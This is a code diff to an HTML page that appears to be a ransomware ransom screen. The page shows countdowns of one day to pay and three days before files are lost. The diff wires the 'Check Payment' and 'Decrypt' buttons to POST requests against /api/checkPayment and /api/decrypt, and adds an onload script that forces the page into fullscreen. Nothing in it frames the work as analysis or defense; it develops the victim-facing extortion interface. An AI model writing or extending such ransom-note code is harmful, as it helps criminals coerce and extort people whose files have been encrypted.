@@ -17,7 +17,7 @@
             position: relative;
             z-index: 1;
             max-width: 800px;
-            margin: 50px auto;
+            margin: 40px auto;
             background-color: #34495E; /* Đổi màu nền container */
             padding: 20px;
             border: 2px solid #1ABC9C; /* Đổi màu viền */
@@ -145,8 +145,8 @@
         </div>
 
         <div class="footer">
-            <button class="check-payment"><strong>Check Payment</strong></button>
-            <button class="decrypt"><strong>Decrypt</strong></button>
+            <button class="check-payment" onclick="sendAjax('checkPayment')"><strong>Check Payment</strong></button>
+            <button class="decrypt" onclick="sendAjax('decrypt')"><strong>Decrypt</strong></button>
         </div>
     </div>
 
@@ -208,6 +208,39 @@
 
         startCountdown('time-left-payment', 24 * 60 * 60); // 1 day
         startCountdown('time-left-files', 3 * 24 * 60 * 60); // 3 days
+
+        // Hàm gửi AJAX
+        function sendAjax(action) {
+            const url = `/api/${action}`;
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ action })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert(data.message); // Hiển thị phản hồi từ server
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+    <script>
+        window.onload = function () {
+            const elem = document.documentElement; // To make the whole page fullscreen
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.mozRequestFullScreen) { // Firefox
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { // IE/Edge
+                elem.msRequestFullscreen();
+            }
+        };
     </script>
 </body>
 </html>
